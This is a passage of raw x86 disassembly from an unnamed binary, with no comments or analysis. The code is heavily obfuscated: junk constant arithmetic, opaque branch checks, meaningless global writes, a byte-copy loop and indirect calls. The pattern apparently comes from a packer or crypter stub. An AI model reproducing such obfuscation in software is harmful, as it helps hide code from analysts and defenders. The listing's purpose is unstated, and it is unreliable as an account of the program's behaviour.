  41cc82:	mov    DWORD PTR [ebp-0x34],0x3663
  41cc89:	mov    DWORD PTR [ebp-0xb4],0x3165
  41cc93:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  41cc9d:	mov    DWORD PTR [ebp-0xbc],0x43cc
  41cca7:	mov    DWORD PTR [ebp-0xb0],0x7564
  41ccb1:	mov    DWORD PTR [ebp-0xac],0x18cf
  41ccbb:	mov    DWORD PTR [ebp-0xa0],0x3135
  41ccc5:	mov    DWORD PTR [ebp-0x9c],0x568d
  41cccf:	mov    DWORD PTR [ebp-0x90],0x11f2
  41ccd9:	mov    DWORD PTR [ebp-0x8c],0x63ea
  41cce3:	mov    DWORD PTR [ebp-0x10],0x3066
  41ccea:	mov    DWORD PTR [ebp-0x8],0x6ed2
  41ccf1:	push   0x7e1d
  41ccf6:	mov    DWORD PTR [ebp-0x4],0x30f4
  41ccfd:	mov    eax,DWORD PTR [ebp-0x20]
  41cd00:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cd03:	push   0x5380
  41cd08:	push   ecx
  41cd09:	push   eax
  41cd0a:	call   0x41dfb1
  41cd0f:	mov    ecx,eax
  41cd11:	mov    eax,DWORD PTR [ebp-0x30]
  41cd14:	xor    ecx,eax
  41cd16:	mov    esi,edx
  41cd18:	mov    edx,DWORD PTR [ebp-0x2c]
  41cd1b:	mov    eax,DWORD PTR [ebp-0x40]
  41cd1e:	xor    esi,edx
  41cd20:	mov    edx,DWORD PTR [ebp-0x3c]
  41cd23:	xor    ecx,0xf3a
  41cd29:	or     ecx,eax
  41cd2b:	mov    eax,ds:0x422268
  41cd30:	mov    eax,DWORD PTR [eax+0x1d8]
  41cd36:	mov    eax,DWORD PTR [eax]
  41cd38:	xor    esi,0x6665
  41cd3e:	or     esi,edx
  41cd40:	add    ecx,0xef6a96a5
  41cd46:	cdq    
  41cd47:	adc    esi,0xc8b6a000
  41cd4d:	cmp    eax,ecx
  41cd4f:	jne    0x41cd5d
  41cd55:	cmp    edx,esi
  41cd57:	je     0x41cdbc
  41cd5d:	mov    eax,DWORD PTR [ebp-0x50]
  41cd60:	mov    ecx,DWORD PTR [ebp-0x4c]
  41cd63:	mov    edx,DWORD PTR [ebp-0x60]
  41cd66:	mov    esi,DWORD PTR [ebp-0x5c]
  41cd69:	add    eax,0x7818
  41cd6e:	adc    ecx,0x87
  41cd74:	or     eax,edx
  41cd76:	mov    edx,DWORD PTR [ebp-0x70]
  41cd79:	or     ecx,esi
  41cd7b:	mov    esi,DWORD PTR [ebp-0x6c]
  41cd7e:	push   esi
  41cd7f:	push   edx
  41cd80:	push   ecx
  41cd81:	push   eax
  41cd82:	call   0x41dfb1
  41cd87:	mov    ecx,DWORD PTR [ebp-0x80]
  41cd8a:	mov    esi,DWORD PTR [ebp-0x7c]
  41cd8d:	and    eax,ecx
  41cd8f:	mov    ecx,DWORD PTR ds:0x422268
  41cd95:	mov    ecx,DWORD PTR [ecx+0x1d0]
  41cd9b:	mov    ecx,DWORD PTR [ecx]
  41cd9d:	and    edx,esi
  41cd9f:	xor    eax,0x2b01
  41cda4:	xor    edx,0x2021
  41cdaa:	xor    esi,esi
  41cdac:	cmp    ecx,eax
  41cdae:	jne    0x41cefa
  41cdb4:	cmp    esi,edx
  41cdb6:	jne    0x41cefa
  41cdbc:	mov    eax,DWORD PTR [ebp-0xa4]
  41cdc2:	mov    ecx,DWORD PTR [ebp-0xc]
  41cdc5:	add    eax,0x80ca
  41cdca:	or     eax,ecx
  41cdcc:	mov    ecx,DWORD PTR ds:0x422304
  41cdd2:	or     eax,0x686
  41cdd7:	xor    eax,0x3eec
  41cddc:	lea    eax,[eax+ecx*1-0xc11b]
  41cde3:	xor    DWORD PTR ds:0x4222fc,eax
  41cde9:	mov    eax,DWORD PTR [ebp-0x64]
  41cdec:	and    eax,0x4dff
  41cdf1:	add    eax,DWORD PTR [ebp-0x14]
  41cdf4:	mov    ecx,DWORD PTR [ebp-0x94]
  41cdfa:	xor    eax,0x676c
  41cdff:	xor    edx,edx
  41ce01:	div    ecx
  41ce03:	mov    ecx,DWORD PTR [ebp-0x24]
  41ce06:	mov    edx,DWORD PTR [ebp-0x74]
  41ce09:	xor    ecx,0x6e1e
  41ce0f:	imul   ecx,edx
  41ce12:	mov    edx,DWORD PTR [ebp+0x8]
  41ce15:	push   0x4
  41ce17:	push   0xe4c37b20
  41ce1c:	xor    eax,0x3884
  41ce21:	mov    eax,DWORD PTR [eax+edx*1]
  41ce24:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  41ce2b:	mov    eax,DWORD PTR [ebp-0x34]
  41ce2e:	mov    edx,DWORD PTR [ebp-0xb4]
  41ce34:	lea    eax,[edx+eax*1-0x76d2]
  41ce3b:	mov    edx,DWORD PTR [ebp-0x44]
  41ce3e:	mov    esi,DWORD PTR [ebp-0x84]
  41ce44:	or     eax,edx
  41ce46:	xor    edx,edx
  41ce48:	div    esi
  41ce4a:	mov    edx,DWORD PTR [ebp-0x54]
  41ce4d:	add    eax,0x43d7
  41ce52:	xor    eax,0x5e6a
  41ce57:	add    eax,DWORD PTR [edx+ecx*1]
  41ce5a:	mov    ecx,DWORD PTR ds:0x4222fc
  41ce60:	add    DWORD PTR [eax],ecx
  41ce62:	mov    eax,DWORD PTR [ebp-0x90]
  41ce68:	mov    ecx,DWORD PTR [ebp-0x8c]
  41ce6e:	mov    edx,DWORD PTR [ebp-0xa0]
  41ce74:	mov    esi,DWORD PTR [ebp-0x9c]
  41ce7a:	sub    edx,eax
  41ce7c:	mov    eax,DWORD PTR [ebp-0xb0]
  41ce82:	sbb    esi,ecx
  41ce84:	mov    ecx,DWORD PTR [ebp-0xac]
  41ce8a:	xor    edx,eax
  41ce8c:	mov    eax,DWORD PTR [ebp-0xc0]
  41ce92:	xor    esi,ecx
  41ce94:	mov    ecx,DWORD PTR [ebp-0xbc]
  41ce9a:	add    edx,eax
  41ce9c:	adc    esi,ecx
  41ce9e:	add    edx,0x2313
  41cea4:	adc    esi,0x2a00
  41ceaa:	push   esi
  41ceab:	push   edx
  41ceac:	call   0x421af6
  41ceb1:	mov    ecx,0x1207
  41ceb6:	sub    ecx,eax
  41ceb8:	push   0x0
  41ceba:	pop    eax
  41cebb:	sbb    eax,edx
  41cebd:	mov    edx,DWORD PTR ds:0x4222fc
  41cec3:	xor    esi,esi
  41cec5:	cmp    edx,ecx
  41cec7:	jne    0x41cefa
  41cecd:	cmp    esi,eax
  41cecf:	jne    0x41cefa
  41ced5:	mov    eax,DWORD PTR [ebp-0x4]
  41ced8:	mov    ecx,DWORD PTR [ebp-0x8]
  41cedb:	add    eax,0x4296
  41cee0:	shr    eax,0x2
  41cee3:	or     eax,ecx
  41cee5:	mov    ecx,DWORD PTR [ebp-0x10]
  41cee8:	xor    eax,ecx
  41ceea:	xor    eax,0x4e94
  41ceef:	add    eax,DWORD PTR ds:0x4222fc
  41cef5:	mov    ds:0x422304,eax
  41cefa:	pop    esi
  41cefb:	leave  
  41cefc:	ret    0x4
  41ceff:	push   ebp
  41cf00:	mov    ebp,esp
  41cf02:	sub    esp,0x58
  41cf05:	push   ebx
  41cf06:	push   esi
  41cf07:	push   edi
  41cf08:	mov    DWORD PTR [ebp-0x58],0x3082
  41cf0f:	mov    DWORD PTR [ebp-0x54],0x37a2
  41cf16:	mov    DWORD PTR [ebp-0x50],0x49d6
  41cf1d:	mov    DWORD PTR [ebp-0x4c],0x6390
  41cf24:	mov    DWORD PTR [ebp-0x48],0x40f2
  41cf2b:	mov    DWORD PTR [ebp-0x44],0x21d4
  41cf32:	mov    DWORD PTR [ebp-0x28],0x4726
  41cf39:	mov    DWORD PTR [ebp-0x24],0x221a
  41cf40:	mov    DWORD PTR [ebp-0x30],0x768c
  41cf47:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41cf4e:	mov    DWORD PTR [ebp-0x40],0x6cf6
  41cf55:	mov    DWORD PTR [ebp-0x3c],0x94c
  41cf5c:	mov    DWORD PTR [ebp-0x38],0x4797
  41cf63:	mov    DWORD PTR [ebp-0x34],0x4439
  41cf6a:	mov    DWORD PTR [ebp-0x20],0x2531
  41cf71:	mov    esi,0x5a3e
  41cf76:	mov    DWORD PTR [ebp-0x1c],esi
  41cf79:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  41cf80:	mov    DWORD PTR [ebp-0x14],0x7
  41cf87:	mov    DWORD PTR [ebp-0x10],0xe3a
  41cf8e:	mov    DWORD PTR [ebp-0xc],0x6a6e
  41cf95:	mov    DWORD PTR [ebp-0x8],0x6b99
  41cf9c:	mov    DWORD PTR [ebp-0x4],0x2acd
  41cfa3:	mov    eax,DWORD PTR [ebp-0x10]
  41cfa6:	mov    ecx,DWORD PTR [ebp-0xc]
  41cfa9:	mov    eax,DWORD PTR [ebp-0x8]
  41cfac:	mov    ecx,DWORD PTR [ebp-0x4]
  41cfaf:	mov    eax,DWORD PTR [ebp-0x18]
  41cfb2:	mov    ecx,DWORD PTR [ebp-0x14]
  41cfb5:	mov    eax,DWORD PTR [ebp-0x8]
  41cfb8:	mov    ecx,DWORD PTR [ebp-0x4]
  41cfbb:	mov    edx,DWORD PTR [ebp-0x10]
  41cfbe:	mov    edi,DWORD PTR [ebp-0xc]
  41cfc1:	add    eax,edx
  41cfc3:	mov    edx,DWORD PTR [ebp-0x18]
  41cfc6:	adc    ecx,edi
  41cfc8:	mov    edi,DWORD PTR [ebp-0x14]
  41cfcb:	push   edi
  41cfcc:	push   edx
  41cfcd:	or     ecx,0x6833
  41cfd3:	or     eax,0x6b80
  41cfd8:	push   ecx
  41cfd9:	push   eax
  41cfda:	call   0x421af6
  41cfdf:	mov    ecx,DWORD PTR [ebp-0x20]
  41cfe2:	mov    edi,DWORD PTR [ebp-0x1c]
  41cfe5:	and    eax,0x25cb
  41cfea:	or     eax,ecx
  41cfec:	mov    ecx,DWORD PTR [ebp-0x20]
  41cfef:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cff2:	and    edx,0x76f2
  41cff8:	or     edx,edi
  41cffa:	xor    edx,esi
  41cffc:	xor    eax,0x253b
  41d001:	shld   edx,eax,0x2
  41d005:	shl    eax,0x2
  41d008:	shr    ecx,0x1e
  41d00b:	xor    esi,esi
  41d00d:	or     eax,ecx
  41d00f:	or     edx,esi
  41d011:	mov    edi,0xba699573
  41d016:	xor    eax,edi
  41d018:	mov    DWORD PTR [ebp-0x20],eax
  41d01b:	mov    esi,0x9c0a89d8
  41d020:	xor    edx,esi
  41d022:	mov    DWORD PTR [ebp-0x1c],edx
  41d025:	mov    eax,DWORD PTR [ebp-0x38]
  41d028:	mov    ecx,DWORD PTR [ebp-0x34]
  41d02b:	mov    edx,DWORD PTR [ebp-0x40]
  41d02e:	mov    ebx,DWORD PTR [ebp-0x3c]
  41d031:	push   ebx
  41d032:	push   edx
  41d033:	push   ecx
  41d034:	push   eax
  41d035:	call   0x41dfb1
  41d03a:	add    eax,0x536a
  41d03f:	adc    edx,0x9573
  41d045:	push   0x12613
  41d04a:	push   0xae21daec
  41d04f:	push   edx
  41d050:	push   eax
  41d051:	call   0x421af6
  41d056:	mov    ecx,eax
  41d058:	mov    eax,DWORD PTR [ebp-0x20]
  41d05b:	mov    ebx,DWORD PTR [ebp-0x1c]
  41d05e:	xor    ecx,0x1b8b
  41d064:	xor    edx,0x0
  41d067:	add    ecx,eax
  41d069:	mov    eax,DWORD PTR [ebp+0xc]
  41d06c:	adc    edx,ebx
  41d06e:	mov    DWORD PTR [eax],ecx
  41d070:	mov    DWORD PTR [eax+0x4],edx
  41d073:	mov    eax,DWORD PTR [ebp-0x30]
  41d076:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d079:	mov    edx,0xbdb2
  41d07e:	sub    edx,eax
  41d080:	mov    eax,DWORD PTR [ebp-0x28]
  41d083:	mov    ebx,0x4c02
  41d088:	sbb    ebx,ecx
  41d08a:	mov    ecx,DWORD PTR [ebp-0x24]
  41d08d:	sub    edx,eax
  41d08f:	mov    eax,DWORD PTR [ebp+0xc]
  41d092:	sbb    ebx,ecx
  41d094:	add    edx,DWORD PTR [eax]
  41d096:	mov    ecx,DWORD PTR [ebp-0x28]
  41d099:	adc    ebx,DWORD PTR [eax+0x4]
  41d09c:	push   0x2
  41d09e:	xor    ebx,esi
  41d0a0:	mov    esi,DWORD PTR [ebp-0x24]
  41d0a3:	pop    esi
  41d0a4:	sub    esi,ecx
  41d0a6:	mov    ecx,DWORD PTR [ebp-0x30]
  41d0a9:	sub    esi,ecx
  41d0ab:	xor    edx,edi
  41d0ad:	mov    edi,DWORD PTR [ebp-0x2c]
  41d0b0:	mov    ecx,DWORD PTR [ebp+0xc]
  41d0b3:	add    esi,DWORD PTR [ecx]
  41d0b5:	mov    eax,ebx
  41d0b7:	shrd   edx,eax,0x2
  41d0bb:	xor    ecx,ecx
  41d0bd:	shl    esi,0x1e
  41d0c0:	shr    eax,0x2
  41d0c3:	or     ecx,edx
  41d0c5:	xor    esi,0xc0000000
  41d0cb:	or     esi,eax
  41d0cd:	mov    DWORD PTR [ebp-0x40],ecx
  41d0d0:	push   0x0
  41d0d2:	mov    DWORD PTR [ebp-0x3c],esi
  41d0d5:	mov    eax,DWORD PTR [ebp-0x48]
  41d0d8:	mov    ecx,DWORD PTR [ebp-0x44]
  41d0db:	push   0xae0404d3
  41d0e0:	push   ecx
  41d0e1:	push   eax
  41d0e2:	call   0x421af6
  41d0e7:	mov    ecx,eax
  41d0e9:	mov    eax,DWORD PTR [ebp-0x50]
  41d0ec:	mov    esi,DWORD PTR [ebp-0x4c]
  41d0ef:	or     ecx,eax
  41d0f1:	mov    eax,DWORD PTR [ebp-0x40]
  41d0f4:	or     edx,esi
  41d0f6:	mov    esi,DWORD PTR [ebp-0x3c]
  41d0f9:	add    ecx,eax
  41d0fb:	mov    eax,DWORD PTR [ebp-0x58]
  41d0fe:	adc    edx,esi
  41d100:	mov    esi,DWORD PTR [ebp-0x54]
  41d103:	add    ecx,eax
  41d105:	mov    eax,DWORD PTR [ebp+0x8]
  41d108:	adc    edx,esi
  41d10a:	add    ecx,0xffff55a8
  41d110:	pop    edi
  41d111:	adc    edx,0xffff64cd
  41d117:	pop    esi
  41d118:	mov    DWORD PTR [eax],ecx
  41d11a:	mov    DWORD PTR [eax+0x4],edx
  41d11d:	pop    ebx
  41d11e:	leave  
  41d11f:	ret    0x8
  41d122:	push   ebp
  41d123:	mov    ebp,esp
  41d125:	sub    esp,0x3c
  41d128:	mov    DWORD PTR [ebp-0x20],0x3510
  41d12f:	mov    DWORD PTR [ebp-0x1c],0x2104
  41d136:	mov    DWORD PTR [ebp-0x18],0x5d15
  41d13d:	mov    DWORD PTR [ebp-0x14],0x30cd
  41d144:	mov    DWORD PTR [ebp-0x10],0x1709
  41d14b:	mov    DWORD PTR [ebp-0xc],0x260b
  41d152:	mov    DWORD PTR [ebp-0x8],0x3204
  41d159:	mov    DWORD PTR [ebp-0x4],0x62ea
  41d160:	mov    DWORD PTR [ebp-0x38],0x58e9
  41d167:	mov    DWORD PTR [ebp-0x34],0x7f89
  41d16e:	mov    DWORD PTR [ebp-0x30],0x7fda
  41d175:	mov    DWORD PTR [ebp-0x2c],0x2889
  41d17c:	mov    DWORD PTR [ebp-0x28],0xf0f
  41d183:	mov    DWORD PTR [ebp-0x24],0x58e1
  41d18a:	mov    DWORD PTR [ebp-0x3c],0x69c
  41d191:	mov    eax,DWORD PTR [ebp-0x10]
  41d194:	mov    ecx,DWORD PTR [ebp-0x14]
  41d197:	and    al,0xb9
  41d199:	add    al,cl
  41d19b:	mov    ecx,DWORD PTR [ebp-0x18]
  41d19e:	and    al,cl
  41d1a0:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d1a3:	sub    al,0x11
  41d1a5:	and    al,cl
  41d1a7:	mov    ecx,DWORD PTR [ebp-0x20]
  41d1aa:	mov    edx,DWORD PTR [ebp+0x8]
  41d1ad:	imul   ecx,ecx,0x6008
  41d1b3:	add    ecx,0x1759dd6e
  41d1b9:	add    al,0x4d
  41d1bb:	xor    ecx,0x2b4185ee
  41d1c1:	cmp    BYTE PTR [ecx+edx*1],al
  41d1c4:	jne    0x41d25e
  41d1ca:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1cd:	mov    eax,0xffffeff8
  41d1d2:	mov    edx,eax
  41d1d4:	sub    edx,ecx
  41d1d6:	add    edx,DWORD PTR [ebp-0x8]
  41d1d9:	mov    ecx,DWORD PTR [ebp-0xc]
  41d1dc:	or     edx,ecx
  41d1de:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1e1:	imul   edx,edx,0x85300
  41d1e7:	sub    eax,ecx
  41d1e9:	add    eax,DWORD PTR [ebp-0x8]
  41d1ec:	mov    ecx,DWORD PTR [ebp-0xc]
  41d1ef:	or     eax,ecx
  41d1f1:	mov    ecx,DWORD PTR [ebp+0x8]
  41d1f4:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  41d1fb:	add    eax,0x40e5
  41d200:	imul   eax,eax,0x214c
  41d206:	add    eax,ecx
  41d208:	mov    ecx,DWORD PTR [ebp+0x8]
  41d20b:	add    ecx,eax
  41d20d:	mov    DWORD PTR [ebp+0x8],ecx
  41d210:	mov    eax,DWORD PTR [ebp-0x24]
  41d213:	mov    ecx,DWORD PTR [ebp-0x28]
  41d216:	and    eax,ecx
  41d218:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d21b:	and    eax,ecx
  41d21d:	mov    ecx,DWORD PTR [ebp-0x30]
  41d220:	imul   eax,ecx
  41d223:	mov    ecx,DWORD PTR [ebp-0x34]
  41d226:	or     eax,ecx
  41d228:	mov    ecx,DWORD PTR [ebp-0x38]
  41d22b:	imul   eax,ecx
  41d22e:	mov    ecx,DWORD PTR [ebp+0x8]
  41d231:	sub    eax,0x777ea653
  41d236:	cmp    DWORD PTR [ecx+0x54],eax
  41d239:	je     0x41d247
  41d23f:	mov    eax,DWORD PTR [ebp+0x8]
  41d242:	jmp    0x41d28e
  41d247:	mov    eax,DWORD PTR [ebp-0x3c]
  41d24a:	sub    eax,0x5258
  41d24f:	xor    eax,0x49e9
  41d254:	add    eax,0x253
  41d259:	jmp    0x41d28e
  41d25e:	mov    DWORD PTR [ebp-0x3c],0x4177
  41d265:	mov    DWORD PTR [ebp+0x8],0x1405
  41d26c:	mov    eax,DWORD PTR [ebp+0x8]
  41d26f:	mov    ecx,DWORD PTR [ebp-0x3c]
  41d272:	imul   eax,eax,0x58cc
  41d278:	add    eax,0x3f39
  41d27d:	and    eax,ecx
  41d27f:	add    eax,0x3b90
  41d284:	or     eax,0x4b1c
  41d289:	sub    eax,0x7fdd
  41d28e:	leave  
  41d28f:	ret    0x4
  41d292:	push   ebp
  41d293:	mov    ebp,esp
  41d295:	and    esp,0xfffffff8
  41d298:	sub    esp,0x20
  41d29b:	push   ebx
  41d29c:	push   esi
  41d29d:	lea    eax,[esp+0x10]
  41d2a1:	mov    DWORD PTR [esp+0xc],eax
  41d2a5:	mov    eax,DWORD PTR [esp+0xc]
  41d2a9:	mov    ecx,DWORD PTR [esp+0x10]
  41d2ad:	mov    edx,DWORD PTR [esp+0x14]
  41d2b1:	sub    DWORD PTR [eax],ecx
  41d2b3:	sbb    DWORD PTR [eax+0x4],edx
  41d2b6:	mov    eax,DWORD PTR [esp+0xc]
  41d2ba:	or     DWORD PTR [eax],0xba6d9573
  41d2c0:	or     DWORD PTR [eax+0x4],0x9c0a89d8
  41d2c7:	lea    eax,[esp+0x18]
  41d2cb:	push   eax
  41d2cc:	lea    eax,[esp+0x24]
  41d2d0:	push   eax
  41d2d1:	call   0x41ceff
  41d2d6:	mov    eax,DWORD PTR [esp+0x18]
  41d2da:	mov    ecx,DWORD PTR [esp+0x1c]
  41d2de:	push   DWORD PTR [ebp+0x18]
  41d2e1:	mov    ebx,DWORD PTR [ebp+0xc]
  41d2e4:	push   DWORD PTR [ebp+0x14]
  41d2e7:	mov    esi,DWORD PTR [ebp+0x8]
  41d2ea:	push   DWORD PTR [ebp+0x10]
  41d2ed:	push   DWORD PTR [esp+0x20]
  41d2f1:	push   DWORD PTR [esp+0x20]
  41d2f5:	push   DWORD PTR [esp+0x38]
  41d2f9:	push   DWORD PTR [esp+0x38]
  41d2fd:	call   0x401000
  41d302:	pop    esi
  41d303:	pop    ebx
  41d304:	mov    esp,ebp
  41d306:	pop    ebp
  41d307:	ret    0x14
  41d30a:	push   ebp
  41d30b:	mov    ebp,esp
  41d30d:	sub    esp,0x28
  41d310:	push   ebx
  41d311:	push   esi
  41d312:	push   edi
  41d313:	mov    DWORD PTR [ebp-0x10],0x6b3
  41d31a:	mov    DWORD PTR [ebp-0xc],0x816
  41d321:	mov    DWORD PTR [ebp-0x8],0x248f
  41d328:	mov    DWORD PTR [ebp-0x20],0x4ef0
  41d32f:	mov    DWORD PTR [ebp-0x1c],0x647f
  41d336:	mov    DWORD PTR [ebp-0x4],0x2
  41d33d:	mov    DWORD PTR [ebp-0x18],0x21b3
  41d344:	mov    DWORD PTR [ebp-0x14],0x7c
  41d34b:	mov    DWORD PTR [ebp-0x28],0x77e3
  41d352:	mov    DWORD PTR [ebp-0x24],0x2866
  41d359:	mov    ecx,DWORD PTR [ebp-0x4]
  41d35c:	xor    edx,edx
  41d35e:	mov    eax,0x723d
  41d363:	div    ecx
  41d365:	mov    esi,0xffff8748
  41d36a:	mov    edi,0x7929
  41d36f:	mov    ecx,eax
  41d371:	mov    eax,DWORD PTR [ebp-0x1c]
  41d374:	imul   ecx,eax
  41d377:	mov    eax,DWORD PTR [ebp-0x20]
  41d37a:	imul   ecx,ecx,0x758c
  41d380:	xor    ecx,0x3583
  41d386:	or     ecx,eax
  41d388:	mov    eax,DWORD PTR [ebp-0x8]
  41d38b:	mov    edx,DWORD PTR [ebp-0xc]
  41d38e:	xor    eax,edx
  41d390:	mov    edx,DWORD PTR [ebp-0x10]
  41d393:	and    eax,edx
  41d395:	sub    eax,0x2ff7
  41d39a:	xor    eax,0x53d2
  41d39f:	xor    edx,edx
  41d3a1:	add    ecx,0x5a905891
  41d3a7:	div    esi
  41d3a9:	mov    esi,0x564d
  41d3ae:	jmp    0x41d43f
  41d3b3:	mov    DWORD PTR [ebp-0x4],0x3574
  41d3ba:	mov    ebx,DWORD PTR [ebp+0xc]
  41d3bd:	mov    DWORD PTR [ebp-0x1c],0x4b01
  41d3c4:	mov    DWORD PTR [ebp-0x20],0x7c1
  41d3cb:	mov    eax,DWORD PTR [ebp-0x20]
  41d3ce:	mov    edx,DWORD PTR [ebp-0x1c]
  41d3d1:	or     eax,0x4cf5
  41d3d6:	xor    eax,edx
  41d3d8:	mov    edx,DWORD PTR [ebp-0x4]
  41d3db:	sub    eax,edx
  41d3dd:	xor    eax,0x2ec2
  41d3e2:	mov    edx,ecx
  41d3e4:	sub    edx,eax
  41d3e6:	sub    edx,0x564a
  41d3ec:	mov    DWORD PTR [ebp-0x4],edx
  41d3ef:	mov    eax,DWORD PTR [ebp-0x4]
  41d3f2:	mov    edx,DWORD PTR [ebp-0x4]
  41d3f5:	mov    dl,BYTE PTR [edx+ebx*1]
  41d3f8:	mov    ebx,DWORD PTR [ebp+0x8]
  41d3fb:	mov    BYTE PTR [eax+ebx*1],dl
  41d3fe:	mov    eax,DWORD PTR [ebp-0x24]
  41d401:	mov    edx,DWORD PTR [ebp-0x28]
  41d404:	imul   eax,edx
  41d407:	imul   eax,eax,0x24ef285a
  41d40d:	sub    eax,0x1e23
  41d412:	imul   eax,eax,0x1ef9
  41d418:	xor    eax,0xb5479168
  41d41d:	add    ecx,eax
  41d41f:	mov    eax,DWORD PTR [ebp-0x8]
  41d422:	mov    edx,DWORD PTR [ebp-0xc]
  41d425:	xor    eax,edx
  41d427:	mov    edx,DWORD PTR [ebp-0x10]
  41d42a:	and    eax,edx
  41d42c:	sub    eax,0x2ff7
  41d431:	xor    eax,0x53d2
  41d436:	xor    edx,edx
  41d438:	mov    ebx,0xffff8748
  41d43d:	div    ebx
  41d43f:	mov    edx,DWORD PTR [ebp+0x10]
  41d442:	sub    edx,eax
  41d444:	mov    eax,DWORD PTR [ebp-0x14]
  41d447:	add    eax,0x38ab
  41d44c:	xor    eax,edi
  41d44e:	add    eax,DWORD PTR [ebp-0x18]
  41d451:	mov    ebx,ecx
  41d453:	xor    eax,esi
  41d455:	sub    ebx,eax
  41d457:	cmp    ebx,edx
  41d459:	jbe    0x41d3b3
  41d45f:	pop    edi
  41d460:	pop    esi
  41d461:	pop    ebx
  41d462:	leave  
  41d463:	ret    0xc
  41d466:	push   ebp
  41d467:	mov    ebp,esp
  41d469:	sub    esp,0x7c
  41d46c:	or     DWORD PTR ds:0x4229a6,ebx
  41d472:	push   ebx
  41d473:	sub    ebx,edx
  41d475:	push   esi
  41d476:	push   edi
  41d477:	movzx  ebx,BYTE PTR ds:0x4228ae
  41d47e:	and    DWORD PTR ds:0x422986,ebx
  41d484:	mov    eax,DWORD PTR [ebp+0x8]
  41d487:	mov    ecx,DWORD PTR [ebp+0xc]
  41d48a:	shrd   eax,ecx,0x2
  41d48e:	cmp    DWORD PTR ds:0x4229ce,0x0
  41d495:	mov    DWORD PTR ds:0x42298a,edx
  41d49b:	mov    esi,0x951
  41d4a0:	jmp    0x41d4fb
  41d4a5:	movzx  ebx,BYTE PTR ds:0x42298a
  41d4ac:	jbe    0x41d4de
  41d4b2:	push   0x47c6
  41d4b7:	push   DWORD PTR [ebp-0x28]
  41d4ba:	call   DWORD PTR ds:0x42a038
  41d4c0:	and    esi,0x3e8f
  41d4c6:	mov    esi,DWORD PTR ds:0x4228e6
  41d4cc:	add    DWORD PTR ds:0x42291e,esi
  41d4d2:	sub    esi,edx
  41d4d4:	sub    DWORD PTR ds:0x42297e,0xf26
  41d4de:	adc    DWORD PTR ds:0x4228ee,0x541b
  41d4e8:	xor    esi,esi
  41d4ea:	or     esi,DWORD PTR ds:0x422a3a
  41d4f0:	mov    edi,DWORD PTR ds:0x422ae6
  41d4f6:	sub    edi,esi
  41d4f8:	add    esi,DWORD PTR [esi+edi*1]
  41d4fb:	shr    ecx,0x2
  41d4fe:	mov    ecx,DWORD PTR [ebp+0x8]
  41d501:	mov    edx,DWORD PTR [ebp+0xc]
  41d504:	inc    ebx
  41d505:	xor    edx,edx
  41d507:	cmp    DWORD PTR ds:0x4229a2,0x0
  41d50e:	mov    ebx,DWORD PTR ds:0x422996
  41d514:	mov    DWORD PTR ds:0x422976,0x477d
  41d51e:	mov    DWORD PTR ds:0x4228c2,ebx
  41d524:	mov    DWORD PTR ds:0x4228ae,0x7a5c
  41d52e:	jmp    0x41d571
  41d533:	mov    ebx,0x5fbd
  41d538:	je     0x41d56d
  41d53e:	push   DWORD PTR [ebp-0x28]
  41d541:	push   0x41f8
  41d546:	push   0x6fc1
  41d54b:	push   DWORD PTR [ebp-0x24]
  41d54e:	call   DWORD PTR ds:0x42a05c
  41d554:	and    DWORD PTR ds:0x42296a,edi
  41d55a:	sub    edi,esi
  41d55c:	mov    ebx,DWORD PTR ds:0x422a86
  41d562:	mov    esi,DWORD PTR ds:0x422a9a
  41d568:	sub    esi,ebx
  41d56a:	sub    ebx,DWORD PTR [ebx+esi*1]
  41d56d:	sbb    edi,esi
  41d56f:	not    esi
  41d571:	mov    esi,0x2e9a655c
  41d576:	xor    eax,esi
  41d578:	cmp    DWORD PTR ds:0x422946,0x0
  41d57f:	mov    DWORD PTR ds:0x4229aa,ecx
  41d585:	mov    DWORD PTR ds:0x422936,0x719b
  41d58f:	mov    DWORD PTR ds:0x42290a,0x79d9
  41d599:	mov    DWORD PTR ds:0x4229ba,ecx
  41d59f:	jmp    0x41d628
  41d5a4:	mov    DWORD PTR ds:0x4229b6,0x57de
  41d5ae:	mov    DWORD PTR ds:0x42298e,0x236c
  41d5b8:	ja     0x41d5fa
  41d5be:	push   0x3fc3
  41d5c3:	push   0x4225dc
  41d5c8:	call   DWORD PTR ds:0x42a060
  41d5ce:	sbb    ebx,DWORD PTR ds:0x42294a
  41d5d4:	mov    ebx,DWORD PTR ds:0x422892
  41d5da:	adc    DWORD PTR ds:0x42289e,ebx
  41d5e0:	xor    ebx,ebx
  41d5e2:	or     ebx,DWORD PTR ds:0x422a7a
  41d5e8:	mov    ebx,DWORD PTR [ebx]
  41d5ea:	adc    DWORD PTR ds:0x4229d2,ebx
  41d5f0:	mov    DWORD PTR ds:0x4228ba,0x6b73
  41d5fa:	and    ebx,edi
  41d5fc:	sub    edi,DWORD PTR ds:0x422972
  41d602:	adc    ebx,DWORD PTR ds:0x422922
  41d608:	movzx  ebx,BYTE PTR ds:0x422926
  41d60f:	adc    DWORD PTR ds:0x42294e,ebx
  41d615:	mov    edi,DWORD PTR ds:0x4229da
  41d61b:	xor    ebx,ebx
  41d61d:	or     ebx,DWORD PTR ds:0x422a2e
  41d623:	sub    ebx,edi
  41d625:	or     edi,DWORD PTR [edi+ebx*1]
  41d628:	or     eax,edx
  41d62a:	mov    DWORD PTR ds:0x4228fe,0x3549
  41d634:	mov    DWORD PTR [ebp-0x28],eax
  41d637:	mov    eax,DWORD PTR [ebp+0x8]
  41d63a:	or     edx,0x76a
  41d640:	shl    ecx,0x1e
  41d643:	cmp    DWORD PTR ds:0x4229aa,0x0
  41d64a:	mov    DWORD PTR ds:0x42297e,ebx
  41d650:	mov    ecx,DWORD PTR ds:0x4229be
  41d656:	mov    DWORD PTR ds:0x422962,0x9fe
  41d660:	jmp    0x41d6cb
  41d665:	mov    DWORD PTR ds:0x4228de,edx
  41d66b:	mov    edx,DWORD PTR ds:0x4228ae
  41d671:	jae    0x41d6b0
  41d677:	push   DWORD PTR [ebp-0x18]
